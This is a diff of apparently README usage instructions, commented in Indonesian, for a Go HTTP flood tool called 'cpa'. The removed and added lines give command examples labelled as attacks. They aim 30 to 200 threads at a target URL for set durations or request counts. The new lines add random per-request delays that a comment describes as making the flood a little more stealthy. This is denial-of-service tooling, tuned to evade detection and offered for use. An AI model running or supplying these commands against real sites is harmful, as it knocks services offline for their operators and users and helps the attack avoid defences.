@@ -10,15 +10,17 @@ go build -o cpa cpa.go
 # Lihat help
 ./cpa -help
 
-# Lihat metode yang tersedia
-./cpa -methods
+# Compile dulu
+go build -o cpa cpa.go
 
-# Contoh serangan 60 detik
-./cpa -target https://example.com -method flood -threads 100 -duration 60
+# Delay random antara 100-500ms per request
+./cpa -target https://example.com -method flood -threads 50 -duration 30 -delay-min 100 -delay-max 500
 
-# Kirim 10000 request
-./cpa -target https://example.com -method https -threads 50 -requests 10000
+# Delay tetap 200ms (min dan max sama)
+./cpa -target https://example.com -method https -threads 30 -requests 1000 -delay-min 200 -delay-max 200
 
-# Mode silent (tanpa output detail)
-./cpa -target https://example.com -method gyat -threads 200 -duration 30 -silent
+# Delay kecil (10-50ms) agar tetap cepat tapi sedikit lebih stealth
+./cpa -target https://example.com -method flood -threads 100 -duration 60 -delay-min 10 -delay-max 50
 
+# Tanpa delay (default, untuk kecepatan maksimal)
+./cpa -target https://example.com -method flood -threads 100 -duration 30
